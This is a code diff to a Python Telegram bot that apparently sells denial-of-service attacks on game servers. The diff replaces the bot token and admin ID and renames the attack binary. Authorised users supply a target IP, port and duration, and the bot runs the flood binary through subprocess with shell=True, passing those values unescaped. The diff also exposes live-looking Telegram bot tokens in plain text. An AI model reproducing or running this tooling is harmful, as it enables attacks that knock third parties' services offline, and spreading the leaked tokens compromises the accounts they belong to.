@@ -15,10 +15,10 @@ import socketserver
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7437937181:AAEQJj6FwJxS5XYirBtjAf2GJdxQR0iAXT4')
+bot = telebot.TeleBot('7748076089:AAGuiDwnRgDNvlcwQcegfaeyg-m0jQT6KzQ')
 
 # Admin user IDs
-admin_id = ["6307848319"]
+admin_id = ["6830887977"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -461,10 +461,10 @@ def handle_bgmi_duration(call):
                 return
             bgmi_cooldown[user_id] = datetime.datetime.now()
 
-        record_command_logs(user_id, '/bgmi', target, port, duration)
+        record_command_logs(user_id, '/venompapa', target, port, duration)
         log_command(user_id, target, port, duration)
         start_attack_reply(call.message, target, port, duration)
-        full_command = f"./bgmi {target} {port} {duration} 300"
+        full_command = f"./venompapa {target} {port} {duration} 300"
         subprocess.run(full_command, shell=True)
         response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {duration}"
         bot.send_message(call.message.chat.id, response)
